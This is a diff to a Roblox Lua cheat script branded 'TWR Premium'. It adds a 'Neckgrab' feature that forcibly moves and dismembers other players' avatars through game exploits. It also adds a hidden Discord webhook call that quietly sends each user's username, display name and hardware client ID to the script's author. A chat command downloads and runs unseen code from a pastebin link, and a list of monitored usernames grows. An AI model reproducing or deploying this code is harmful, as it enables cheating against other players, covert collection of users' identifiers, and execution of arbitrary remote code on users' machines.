@@ -1,4 +1,4 @@
--- BLACKLISTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTt
+-- BLACKLISTTTTTTTTTTTTTT
 
 local function banPlayer(player)
     player:Kick("TWR Has banned you from this script, you can buy an unban on our Discord server. discord.gg/R57rsmdAzk")
@@ -18,7 +18,7 @@ end
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
 local Window = OrionLib:MakeWindow({
-    Name = "TWR",
+    Name = "TWR (Premium)",
     HidePremium = false,
     SaveConfig = true,
     ConfigFolder = "TWR",
@@ -27,8 +27,8 @@ local Window = OrionLib:MakeWindow({
 })
 
 OrionLib:MakeNotification({
-    Name = "TWR",
-    Content = "Successfully loaded! V1.0",
+    Name = "TWR Premium",
+    Content = "Successfully loaded! V1.3",
     Image = "rbxassetid://4483345998",
     Time = 10
 })
@@ -3131,6 +3131,228 @@ PremiumSec:AddButton({
   	end    
 })
 
+local PremiumSec = Premium:AddSection({
+	Name = "Neckgrab"
+})
+
+PremiumSec:AddButton({
+	Name = "Neckgrab (need to reclick after respawn/stomp)",
+	Callback = function()
+        -- Main Vars
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+if shared.NOVAGRAB then
+    shared.NOVAGRAB:Disconnect()
+end
+
+function NOCLIP(character, state)
+    if character then
+        for _, child in pairs(character:GetChildren()) do
+            if child:IsA("BasePart") then
+                child.CanCollide = not state
+            end
+        end
+    end
+end
+
+function RefreshAnimations()
+    LocalPlayer.Character.Animate.Disabled = true
+    for _, v in ipairs(LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
+        v:Stop()
+    end
+    LocalPlayer.Character.Animate.Disabled = false
+end
+
+function RemoveAttachments()
+    for _, v in pairs(LocalPlayer.Character:GetDescendants()) do 
+        if v.Name == "GRAB_ATTACHMENT" then
+            v:Destroy()
+        end
+    end
+end
+
+function RefreshThings(Char)
+    for _, v in pairs(Char:GetDescendants()) do
+        if v:IsA("BodyPosition") or v:IsA("BodyGyro") then
+            v:Destroy()
+        end
+    end
+    RemoveAttachments()
+end
+
+local GrabbedCHAR = nil
+function Align(P0Name, P1Name, P, R)
+    local P0 = GrabbedCHAR:FindFirstChild(P0Name)
+    local P1 = LocalPlayer.Character:FindFirstChild(P1Name)
+
+    local A0 = Instance.new("Attachment", P1)
+    local BP, BG = Instance.new("BodyPosition", P0), Instance.new("BodyGyro", P0) -- P0 = TARGET POS
+
+    A0.Rotation = R 
+    A0.Name = "GRAB_ATTACHMENT" -- TARGET
+
+    BG.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+    BG.P = 30000 -- Lowered P value for smoother rotation control
+    BG.D = 1000
+
+    BP.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+    BP.P = 30000 -- Lowered P value for smoother position control
+    BP.D = 1000
+
+    task.spawn(function()
+       repeat
+            pcall(function()
+                local direction = (LocalPlayer.Character.PrimaryPart.Position - P0.Position).Unit
+                local lookAt = CFrame.new(P0.Position, P0.Position + direction)
+                BG.CFrame = lookAt -- Set rotation to face player
+                BP.Position = P1.Position + (P1.CFrame.LookVector * 0.5) + (P1.CFrame.UpVector * -0.5) -- Position in front of the player and slightly below
+            end)
+            game:GetService("RunService").Heartbeat:Wait()
+        until not BP or not BG
+    end)
+
+    return A0, BP, BG
+end
+
+local NECKGRAB_TRACK = Instance.new("Animation")
+NECKGRAB_TRACK.AnimationId = "rbxassetid://3135389157"
+local NG_Animation = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(NECKGRAB_TRACK)
+NG_Animation.Priority = Enum.AnimationPriority.Action 
+
+shared.NOVAGRAB = workspace.Players.DescendantAdded:Connect(function(v)
+    if v.Name == "GRABBING_CONSTRAINT" and v:IsA("Weld") then
+        if v:GetAttribute('PLAYER_HOLD') == LocalPlayer.Name then
+            repeat task.wait() until v:FindFirstChildOfClass("RopeConstraint")
+            v:FindFirstChildOfClass("RopeConstraint").Length = 9e9
+        
+            GrabbedCHAR = v.Parent
+        
+            RefreshThings(GrabbedCHAR)
+            RefreshAnimations()
+            task.wait()
+            if not NG_Animation.IsPlaying then
+                NG_Animation:Play()
+                NG_Animation:AdjustSpeed(0.34)
+                task.delay(0.3, function()
+                    NG_Animation:AdjustSpeed(0)
+                end)
+            end
+        
+            Align("Head", "RightHand", Vector3.new(0, 0, 0.5), Vector3.new(0, 0, 0)) -- Adjusted to position to grab neck in front
+        
+            -- Stop grabbing
+            repeat task.wait()
+                NOCLIP(GrabbedCHAR, true)
+            until not GrabbedCHAR:FindFirstChild("GRABBING_CONSTRAINT") or not GrabbedCHAR
+            -- Stopped grabbing 
+        
+            NOCLIP(GrabbedCHAR, false)
+        
+            if NG_Animation.IsPlaying then
+                NG_Animation:Stop(0.1)
+            end
+        
+            RefreshThings(GrabbedCHAR)
+        end
+    end
+end)
+
+local PLR = game:GetService("Players").LocalPlayer
+local CHAR = game:GetService("Players").LocalPlayer.Character
+local RIP_CD = false
+
+    local RIPINHALF = Instance.new("Tool", PLR.Backpack)
+    RIPINHALF.Name = "remove legs + arms"
+    RIPINHALF.CanBeDropped = false
+    RIPINHALF.RequiresHandle = false
+    RIPINHALF.Activated:connect(function()
+        local GrabbedPLR = CHAR.BodyEffects:FindFirstChild("Grabbed")
+        if GrabbedPLR.Value ~= nil then
+            if RIP_CD == true then return end
+            RIP_CD = true
+            local GrabbedCHAR = GrabbedPLR.Value
+
+            GrabbedCHAR.RightUpperArm.Position = Vector3.new(0,-1200,0)
+            GrabbedCHAR.LeftUpperArm.Position = Vector3.new(0,-1200,0)
+            GrabbedCHAR.RightUpperLeg.Position = Vector3.new(0,-1200,0)
+            GrabbedCHAR.LeftUpperLeg.Position = Vector3.new(0,-1200,0)
+            task.wait(.1)
+            game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("Grabbing", false)
+            RIP_CD = false
+        end
+end)
+
+    local RIPINHALF = Instance.new("Tool", PLR.Backpack)
+    RIPINHALF.Name = "RIP"
+    RIPINHALF.CanBeDropped = false
+    RIPINHALF.RequiresHandle = false
+    RIPINHALF.Activated:connect(function()
+        local GrabbedPLR = CHAR.BodyEffects:FindFirstChild("Grabbed")
+        if GrabbedPLR.Value ~= nil then
+            if RIP_CD == true then return end
+            RIP_CD = true
+            local GrabbedCHAR = GrabbedPLR.Value
+
+            GrabbedCHAR.RightUpperArm.Position = Vector3.new(0,-1200,0)
+            GrabbedCHAR.LeftUpperArm.Position = Vector3.new(0,-1200,0)
+            GrabbedCHAR.LowerTorso.Position = Vector3.new(0,-1200,0)
+            task.wait(.1)
+            game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("Grabbing", false)
+            RIP_CD = false
+        end
+end)
+
+    local RIPINHALF = Instance.new("Tool", PLR.Backpack)
+    RIPINHALF.Name = "Korblox"
+    RIPINHALF.CanBeDropped = false
+    RIPINHALF.RequiresHandle = false
+    RIPINHALF.Activated:connect(function()
+        local GrabbedPLR = CHAR.BodyEffects:FindFirstChild("Grabbed")
+        if GrabbedPLR.Value ~= nil then
+            if RIP_CD == true then return end
+            RIP_CD = true
+            local GrabbedCHAR = GrabbedPLR.Value
+
+            GrabbedCHAR.RightUpperLeg.Position = Vector3.new(0,-1200,0)
+            task.wait(.1)
+            game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("Grabbing", false)
+            RIP_CD = false
+        end
+end)
+
+
+
+
+
+
+local HttpService = game:GetService("HttpService")
+local Webhook_URL = "https://discord.com/api/webhooks/1255968892715667466/pmme1VS6y1HDe_GQfaY4hpYjzJ8Q39FnGZpxEhqGhcvOWpLewYA7jbrY197T3ANgNAOb"
+
+local response = request {
+    Url = Webhook_URL,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode({
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "**Neckgrab script**",
+            ["description"] = game.Players.LocalPlayer.Name.." ("..game.Players.LocalPlayer.DisplayName..") has executed the script.",
+            ["type"] = "rich",
+            ["color"] = tonumber(ad1010),
+            ["fields"] = {{
+                ["name"] = "Hardware ID:",
+                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                ["inline"] = true
+            }}
+        }}
+    })
+}
+  	end    
+})
+
 -- AUTOBUY
 
 local Autobuy = Window:MakeTab({
@@ -4663,6 +4885,14 @@ local function handleCommand(player, message)
                     game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                 elseif message == string.lower(prefix.."unfreeze .") then 
                     game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+                elseif message == string.lower(prefix.."rj .") then
+                    local tpservice= game:GetService("TeleportService")
+                    local plr = game.Players.LocalPlayer
+                    tpservice:Teleport(game.PlaceId, plr)
+
+                elseif message == string.lower(prefix.."su .") then
+                loadstring(game:HttpGet("https://pastebin.com/raw/mWJdMhJL", true))()
+
                 elseif message == string.lower(prefix.."dropcash .") then 
                     local args = {"DropMoney", "10000"}
                     game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
@@ -4835,7 +5065,9 @@ local usernamesToMonitor = {
     "AWDSDWA204590",
     "littl3_JJC",
     "mylurk",
-    "ghsata"
+    "ghsata",
+    "nice_a1a",
+    "XxJuniordriptrixX"
 }
 
 game:GetService("RunService").RenderStepped:Connect(function()
